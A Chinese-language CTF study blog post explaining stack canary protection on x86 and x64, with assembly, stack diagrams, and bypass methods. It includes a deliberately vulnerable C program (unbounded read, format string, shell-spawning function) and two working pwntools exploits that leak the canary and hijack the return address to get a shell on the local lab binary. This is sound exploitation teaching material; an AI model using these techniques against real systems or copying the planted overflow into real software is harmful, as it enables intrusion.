---

title: Pwn-canary
date: 2020-03-31 18:17:55
categories: Pwn
tag: Pwn
classes: wide
---

# Pwn-Canary学习
参考链接：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/
## 0x1 简介：
用于防止栈溢出被利用的一种方法，原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出了。
## 0x2 原理：
在栈底放一个随机数，在函数返回时检查是否被修改。具体实现如下：  
x86 ：  
在函数序言部分插入canary值：
```
mov    eax,gs:0x14
mov    DWORD PTR [ebp-0xc],eax
```
在函数返回之前，会将该值取出，检查是否修改。这个操作即为检测是否发生栈溢出。
```
mov    eax,DWORD PTR [ebp-0xc]
xor    eax,DWORD PTR gs:0x14
je     0x80492b2 <vuln+103> # 正常函数返回
call   0x8049380 <__stack_chk_fail_local> # 调用出错处理函数
```
x86 栈结构大致如下：
```
        High  
        Address |                 |  
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
                | old ebp         |
      ebp =>    +-----------------+
                | ebx             |
    ebp-4 =>    +-----------------+
                | unknown         |
    ebp-8 =>    +-----------------+
                | canary value    |
   ebp-12 =>    +-----------------+
                | 局部变量         |
        Low     |                 |
        Address
```
x64 :  
函数序言：  
```
mov    rax,QWORD PTR fs:0x28
mov    QWORD PTR [rbp-0x8],rax
```
函数返回前：  
```
mov    rax,QWORD PTR [rbp-0x8]
xor    rax,QWORD PTR fs:0x28
je     0x401232 <vuln+102> # 正常函数返回
call   0x401040 <__stack_chk_fail@plt> # 调用出错处理函数
```
x64 栈结构大致如下：
```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
                | old ebp         |
      rbp =>    +-----------------+
                | canary value    |
    rbp-8 =>    +-----------------+
                | 局部变量         |
        Low     |                 |
        Address
```
## 0x3 绕过
### 0x3.1 泄露栈中的Canary
Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。
#### 利用示例
源代码如下：
```c
// ex2.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```
编译为 32bit 程序，开启 NX，ASLR，Canary 保护,需要关闭PIE
```shell
gcc -m32 -no-pie ex2.c -o ex2-x86
```
linux默认开启 NX，ASLR，Canary 保护
首先通过覆盖 Canary 最后一个 \x00 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中
#### EXP
```python
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2-x86'
# context.log_level = 'debug'
io = process('./ex2-x86')

get_shell = ELF("./ex2-x86").sym["getshell"] # 这里是得到getshell函数的起始地址

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload) # 这里使用 sendline() 会在payload后面追加一个换行符 '\n' 对应的十六进制就是0xa

io.recvuntil("A"*100)
Canary = u32(int.from_bytes(io.recv(4),"little"))-0xa # 这里减去0xa是为了减去上面的换行符，得到真正的 Canary
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = b"\x90"*100+p32(Canary)+b"\x90"*12+p32(get_shell) # 使用getshell的函数地址覆盖原来的返回地址
io.send(payload)

io.recv()

io.interactive()
```
编译为64位程序：  
```shell
gcc -no-pie ex2.c -o ex2-x64
```
#### EXP
```python
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2-x64'
# context.log_level = 'debug'
io = process('./ex2-x64')

get_shell = ELF("./ex2-x64").sym["getshell"] # 这里是得到getshell函数的起始地址

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100 + "A" * 4 # 这里再加4个 A 是因为 100 模 8 是 4 ，如果不补齐 8 位，则无法覆盖canary后面的 \x00
io.sendline(payload) # 这里使用 sendline() 会在payload后面追加一个换行符 '\n' 对应的十六进制就是0xa

io.recvuntil("A"*104)
Canary = u64(io.recv(8))-0xa # 这里减去0xa是为了减去上面的换行符，得到真正的 Canary
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = b"\x90"*104+p64(Canary)+b"\x90"*8+p64(get_shell) # 使用getshell的函数地址覆盖原来的返回地址
io.send(payload)

io.recv()

io.interactive()
```
### 0x3.2 one-by-one 爆破 Canary
感觉用处不大，具体的可以看参考链接
### 0x3.3 劫持__stack_chk_fail 函数
已知 Canary 失败的处理逻辑会进入到 __stack_chk_fail 函数，__stack_chk_fail 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。

参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 __stack_chk_fail 的 GOT 表，再进行 ROP 利用  
参考链接：  
https://1ce0ear.github.io/2017/09/29/ZCTF2017-login/  
https://jontsang.github.io/post/34549.html
### 0x3.4 覆盖 TLS 中储存的 Canary 值
已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。

参见 StarCTF2018 babystack  
参考链接：  
https://jontsang.github.io/post/34550.html

